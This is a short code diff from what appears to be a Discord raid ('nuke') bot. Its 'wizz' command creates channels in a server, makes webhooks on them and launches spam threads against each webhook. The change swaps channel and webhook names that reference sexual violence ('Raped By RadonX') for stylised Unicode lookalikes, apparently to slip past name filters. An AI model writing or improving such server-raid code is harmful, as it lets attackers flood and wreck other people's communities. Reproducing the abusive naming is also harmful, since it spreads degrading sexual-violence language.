@@ -165,7 +165,7 @@ async def wizz(ctx):
         channels = []
         for i in range(5):
             try:
-                channel = await ctx.guild.create_text_channel(name='Raped By RadonX')
+                channel = await ctx.guild.create_text_channel(name='ᖇαρҽԃ β¥ Ɽ₳ĐØ₦Ӿ')
                 channels.append(channel)
                 await asyncio.sleep(1)  # Delay to prevent hitting rate limits
             except Exception as e:
@@ -177,7 +177,7 @@ async def wizz(ctx):
 
         for channel in channels:
             try:
-                webhook_name = 'Raped By RadonX'  # Use a name that does not contain "discord"
+                webhook_name = 'Ɽ₳ĐØ₦Ӿ'  # Use a name that does not contain "discord"
                 webhook = await channel.create_webhook(name=webhook_name)
                 threading.Thread(target=ssspam, args=(webhook.url,)).start()
                 await asyncio.sleep(1)  # Delay to prevent hitting rate limits
